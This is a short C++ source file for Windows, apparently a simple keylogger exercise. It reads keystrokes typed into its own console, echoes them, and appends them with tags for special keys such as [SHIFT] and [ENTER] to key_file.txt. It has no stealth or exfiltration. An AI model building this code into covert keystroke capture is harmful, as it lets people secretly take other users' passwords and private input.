#include <iostream>  // input-output stream
#include <windows.h> // importing windows function
#include <conio.h>   // console input-output
#include <fstream>   // file input-output stream
using namespace std;
int keys(char key, fstream &file)
{
    file.open("key_file.txt", ios::app | ios::in | ios::out);
    if (file)
    {
        if (GetAsyncKeyState(VK_SHIFT))
        {
            file << "[SHIFT]";
        }
        else if (GetAsyncKeyState(VK_ESCAPE))
        {
            file << "[ESCAPE]";
        }
        else if (GetAsyncKeyState(VK_RETURN))
        {
            file << "[ENTER]";
        }
        else if (GetAsyncKeyState(VK_CONTROL))
        {
            file << "[CONTROL]";
        }
        else if (GetAsyncKeyState(VK_MENU))
        {
            file << "[ALT]";
        }
        else if (GetAsyncKeyState(VK_DELETE))
        {
            file << "[DELETE]";
        }
        else if (GetAsyncKeyState(VK_TAB))
        {
            file << "[TAB]";
        }
        else if (GetAsyncKeyState(VK_BACK))
        {
            file << "[BACKSPACE]";
        }
        else
        {
            // storing the keystrokes (other than special keys) in the file
            file << key;
        }
    }
    file.close();
    return 0;
}
int main()
{
    char key_press;
    int ascii_value;
    fstream afile;
    afile.open("key_file.txt", ios::in | ios::out);
    afile.close();
    while (true)
    {
        /* Block 1 Starts */
        key_press = getch();
        ascii_value = key_press;
        cout << "Here --> " << key_press << endl;
        if (7 < ascii_value && ascii_value < 256)
        {
            keys(key_press, afile); // calling keys method
        } // if condition over
        /* Block 1 Ends */
    } // while loop over
    return 0;
}